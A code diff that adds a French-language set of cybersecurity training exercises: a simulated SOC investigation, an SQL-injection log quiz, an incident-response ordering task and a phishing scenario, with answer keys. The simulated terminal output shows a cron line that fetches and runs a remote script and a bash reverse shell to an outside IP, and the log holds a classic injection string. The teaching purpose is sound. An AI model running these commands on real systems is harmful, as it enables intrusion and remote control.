@@ -1,0 +1,116 @@
+[
+  {
+    "id": "term-soc-triage",
+    "kind": "terminal",
+    "title": "Enquête sur un poste suspect",
+    "level": 8,
+    "brief": "Un poste Linux du SOC déclenche des alertes. Mène l'investigation étape par étape : trouve le canal de commande & contrôle (C2) et le mécanisme de persistance.",
+    "shell": "analyst@soc:~$",
+    "steps": [
+      {
+        "instruction": "Liste les connexions réseau établies pour repérer un canal sortant anormal.",
+        "expect": "^(ss|netstat)\\b",
+        "hint": "ss -tunp",
+        "output": "Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:Port\ntcp   ESTAB  0      0      10.0.4.12:51544      45.83.12.7:4444   users:((\"bash\",pid=1337))"
+      },
+      {
+        "instruction": "Le port 4444 est classique pour un reverse shell. Affiche les tâches planifiées de l'utilisateur pour chercher une persistance.",
+        "expect": "crontab\\s+-l",
+        "hint": "crontab -l",
+        "output": "# m h dom mon dow command\n*/5 * * * * curl -s http://45.83.12.7/x.sh | bash"
+      },
+      {
+        "instruction": "Confirme le processus malveillant relié à la connexion (PID 1337).",
+        "expect": "(ps\\b.*1337|ls\\b.*/proc/1337|cat\\b.*/proc/1337)",
+        "hint": "ps -p 1337 -o pid,comm,args",
+        "output": "  PID COMMAND  COMMAND\n 1337 bash     bash -i >& /dev/tcp/45.83.12.7/4444 0>&1"
+      }
+    ],
+    "success": "Bravo. Tu as identifié le canal C2 (reverse shell bash vers 45.83.12.7:4444) ET la persistance (une tâche cron qui re-télécharge la charge toutes les 5 minutes). Prochaine étape réelle : isoler la machine du réseau avant de nettoyer.",
+    "tags": ["practice-v1"]
+  },
+  {
+    "id": "analysis-sqli-log",
+    "kind": "analysis",
+    "title": "Repère l'attaque dans les logs",
+    "level": 7,
+    "artifactKind": "log",
+    "brief": "Voici un extrait de journal d'accès d'un serveur web. Une seule de ces requêtes est une tentative d'attaque. Sauras-tu la repérer ?",
+    "lines": [
+      "192.0.2.10 - - GET /index.html 200",
+      "192.0.2.10 - - GET /produits?categorie=chaussures 200",
+      "203.0.113.5 - - GET /login 200",
+      "203.0.113.5 - - GET /produits?id=1%27%20OR%20%271%27%3D%271 200",
+      "192.0.2.10 - - GET /panier 200",
+      "198.51.100.2 - - GET /contact 200"
+    ],
+    "question": "Quelle ligne correspond à une tentative d'injection SQL ?",
+    "correctLine": 3,
+    "explanation": "La valeur du paramètre `id`, une fois décodée, vaut `1' OR '1'='1` : un classique d'injection SQL qui cherche à rendre la condition WHERE toujours vraie. La parade : des requêtes paramétrées (prepared statements).",
+    "tags": ["practice-v1"]
+  },
+  {
+    "id": "order-incident-response",
+    "kind": "order",
+    "title": "Ordonne la réponse à incident",
+    "level": 9,
+    "brief": "Une intrusion vient d'être confirmée. Remets les phases de la réponse à incident dans le bon ordre (modèle SANS).",
+    "prompt": "Touche les étapes dans l'ordre chronologique correct.",
+    "items": [
+      { "id": "eradication", "text": "Éradication : supprimer la cause (malware, compte, accès)" },
+      { "id": "identification", "text": "Identification : détecter et qualifier l'incident" },
+      { "id": "lessons", "text": "Leçons apprises : retour d'expérience et amélioration" },
+      { "id": "preparation", "text": "Préparation : outils, procédures, équipe prêts" },
+      { "id": "recovery", "text": "Rétablissement : remettre les systèmes en production" },
+      { "id": "containment", "text": "Confinement : limiter la propagation, isoler" }
+    ],
+    "correctOrder": ["preparation", "identification", "containment", "eradication", "recovery", "lessons"],
+    "explanation": "Le cycle de réponse à incident (SANS) : Préparation → Identification → Confinement → Éradication → Rétablissement → Leçons apprises. On isole AVANT de nettoyer, et on capitalise à la fin.",
+    "tags": ["practice-v1"]
+  },
+  {
+    "id": "scenario-phishing",
+    "kind": "scenario",
+    "title": "Un e-mail douteux au bureau",
+    "level": 3,
+    "brief": "Tu reçois un e-mail urgent de « ton directeur » demandant un virement immédiat. Fais les bons choix.",
+    "start": "n1",
+    "nodes": {
+      "n1": {
+        "text": "L'e-mail vient de « direction@ton-entreprlse.com » (avec un « l » à la place du « i ») et réclame un virement urgent. Que fais-tu ?",
+        "choices": [
+          { "text": "Je vérifie l'adresse de l'expéditeur de près", "to": "n2" },
+          { "text": "J'exécute le virement, c'est urgent", "to": "bad1" },
+          { "text": "Je réponds pour demander confirmation", "to": "n3" }
+        ]
+      },
+      "n2": {
+        "text": "Bien vu : le domaine est usurpé (« entreprlse » ≠ « entreprise »). Que fais-tu ensuite ?",
+        "choices": [
+          { "text": "Je contacte le directeur par un canal officiel (téléphone connu)", "to": "good1" },
+          { "text": "Je clique sur le lien de l'e-mail pour « vérifier »", "to": "bad2" }
+        ]
+      },
+      "n3": {
+        "text": "Répondre à l'e-mail confirme surtout à l'attaquant que l'adresse est active — et c'est lui qui répondra. Tu réalises que le domaine est bizarre. Que fais-tu ?",
+        "choices": [
+          { "text": "Je contacte le directeur par un canal officiel", "to": "good1" },
+          { "text": "Je fais le virement puisqu'il a « confirmé »", "to": "bad1" }
+        ]
+      },
+      "good1": {
+        "text": "Parfait. Tu as vérifié par un canal de confiance : le directeur n'a jamais envoyé cet e-mail. Tu le signales à la sécurité. C'est exactement la bonne réaction face à une fraude au président (BEC).",
+        "outcome": "good"
+      },
+      "bad1": {
+        "text": "Le virement part vers le compte de l'attaquant : c'est une fraude au président (Business Email Compromise). Ne jamais valider une demande financière urgente sans vérification hors canal.",
+        "outcome": "bad"
+      },
+      "bad2": {
+        "text": "Le lien mène à une fausse page. Même en ayant repéré le domaine, cliquer expose à un malware ou à un vol d'identifiants. On ne clique pas — on vérifie hors de l'e-mail.",
+        "outcome": "bad"
+      }
+    },
+    "tags": ["practice-v1"]
+  }
+]
